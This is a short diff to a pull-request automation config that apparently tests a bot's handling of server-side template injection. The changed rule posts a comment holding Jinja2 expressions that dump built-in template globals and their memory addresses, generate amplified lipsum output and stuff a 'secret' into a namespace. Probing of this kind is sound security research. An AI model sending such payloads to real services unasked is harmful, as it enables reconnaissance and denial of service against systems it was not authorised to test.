@@ -1,11 +1,14 @@
 pull_request_rules:
-  - name: chain-g1
+  - name: chain-dos-amp
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          JOINER={{joiner()|string}}
-          NS={{namespace()|string}}
-          DICT={{dict(a=1,b=2)}}
-          ITEMS={% for k,v in dict(x=lipsum,y=cycler).items() %}{{k}}={{v|string|truncate(60)}},{% endfor %}
+          ADDR_MAP:
+          {% for k,v in dict(lip=lipsum,cyc=cycler,joi=joiner,ns=namespace).items() %}{{k}}={{v|string|truncate(80)}}
+          {% endfor %}
+          LOOP_VAR={% for i in range(3) %}{{loop.index}}/{{loop.length}},{% endfor %}
+          LIPSUM_HEAVY={{lipsum(n=5,html=False)|truncate(500)}}
+          CYCLER_ITEMS={{cycler(1,2,3)|string}}
+          NS_WITH_DATA={{namespace(secret="leaked",addr=lipsum|string)|string}}
